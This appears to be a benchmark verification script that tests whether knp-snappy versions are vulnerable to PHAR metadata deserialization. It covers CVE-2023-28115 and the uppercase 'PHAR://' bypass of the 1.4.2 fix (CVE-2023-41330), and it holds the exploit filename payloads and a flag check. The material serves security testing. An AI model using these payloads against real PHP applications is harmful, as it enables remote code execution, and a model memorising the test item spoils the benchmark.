#!/usr/bin/env bash
# verify.sh (PCBV2-0042, knp-snappy PHAR metadata deserialization oracle)
#
#   --seed     : lowercase "phar://" output filename  (CVE-2023-28115)
#                -> v0 (snappy 1.4.1, no phar guard): file_exists('phar://...') fires PHAR
#                   metadata deser => /trigger returns PCB_FLAG
#                -> v1 (snappy 1.4.2, case-sensitive strpos('phar://') guard): BLOCKED
#   --residual : uppercase "PHAR://" output filename   (CVE-2023-41330)
#                -> v1 (1.4.2): strpos is case-sensitive, PHP wrappers are not =>
#                   PHAR deser still fires => PCB_FLAG returned
#                -> v2 (1.4.3, parse_url + mb_strtolower allowlist): BLOCKED
#
# Flag channel: HTTP GET /trigger?filename=... response body == PCB_FLAG (when marker written).
# Exit: 0 = flag observed, 10 = not observed, 20 = env failure, 30 = usage error.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# Candidate payload for poc/seed_exec.py (expects {"filename": ...}).
if [[ "$MODE" == "--seed" ]]; then
  FILENAME="phar:///app/evil.phar/x"
else
  FILENAME="PHAR:///app/evil.phar/x"
fi
if [[ "$MODE" == "--seed" ]]; then
  PID="cve-2023-28115-lowercase-phar"
else
  PID="cve-2023-41330-uppercase-phar"
fi
printf '{"probe_id":"%s","filename":"%s"}' "$PID" "$FILENAME" > "$WORK_DIR/cand.json"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 800; echo
"$PY" - "$OUT" <<'PYEOF'
import json, os, sys
try:
    d = json.loads(sys.argv[1])
except Exception as e:
    print("verify: bad seed_exec output:", e); sys.exit(20)
body = str(d.get("body") or "")
flag = os.environ.get("RUN_FLAG", "")
print("verify: body =", body[:200])
sys.exit(0 if flag in body else 10)
PYEOF
